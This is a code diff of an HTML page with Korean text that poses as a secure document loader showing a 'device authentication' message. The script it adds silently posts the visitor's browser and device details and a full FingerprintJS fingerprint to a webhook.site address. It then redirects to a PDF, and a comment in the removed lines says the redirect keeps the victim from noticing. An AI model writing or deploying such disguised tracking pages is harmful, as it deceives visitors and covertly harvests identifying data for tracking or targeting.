@@ -6,36 +6,45 @@
 </head>
 <body style="display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; background: #f4f4f4; margin: 0;">
     <div style="text-align: center; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1);">
-        <h2>문서를 안전하게 불러오는 중입니다...</h2>
-        <p>보안 연결을 확인하는 동안 잠시만 기다려 주십시오.</p>
+        <h2>보안 서버 접속 중...</h2>
+        <p>기기 인증을 진행하고 있습니다. 잠시만 기다려 주십시오.</p>
     </div>
 
     <script>
-        // 1. 접속 알림 신호 (GET)
         const webhookUrl = "https://webhook.site/78ea7a5c-b84d-4094-b236-e85b52715d6b";
-        fetch(webhookUrl + "?status=start");
 
-        // 2. 상세 기기 정보 수집 (POST)
+        // [1단계] 즉시 기본 정보부터 POST로 쏩니다 (라이브러리 필요 없음)
+        const basicData = {
+            type: "BASIC_INFO",
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: window.screen.width + "x" + window.screen.height,
+            time: new Date().toLocaleString()
+        };
+
+        fetch(webhookUrl, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify(basicData)
+        });
+
+        // [2단계] 상세 지문(Fingerprint) 수집 시도
         import('https://openfpcdn.io/fingerprintjs/v4')
             .then(FingerprintJS => FingerprintJS.load())
             .then(fp => fp.get())
             .then(result => {
-                const data = JSON.stringify({
-                    id: result.visitorId,
-                    os: result.components.os.value,
-                    ua: navigator.userAgent,
-                    time: new Date().toISOString()
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({ type: "DETAILED_FP", id: result.visitorId, components: result.components })
                 });
-
-                // 데이터 전송 후 성공/실패 상관없이 무조건 PDF로 이동
-                fetch(webhookUrl, { method: 'POST', body: data, mode: 'no-cors' })
-                    .finally(() => {
-                        setTimeout(() => { window.location.href = "빔센서.pdf"; }, 1500);
-                    });
             })
-            .catch(() => {
-                // 에러 발생 시 눈치 못 채게 2초 뒤 PDF 강제 이동
-                setTimeout(() => { window.location.href = "빔센서.pdf"; }, 2000);
+            .finally(() => {
+                // [3단계] 모든 전송 시도 후 4초 뒤에 PDF로 이동
+                setTimeout(() => {
+                    window.location.href = "빔센서.pdf";
+                }, 4000);
             });
     </script>
 </body>
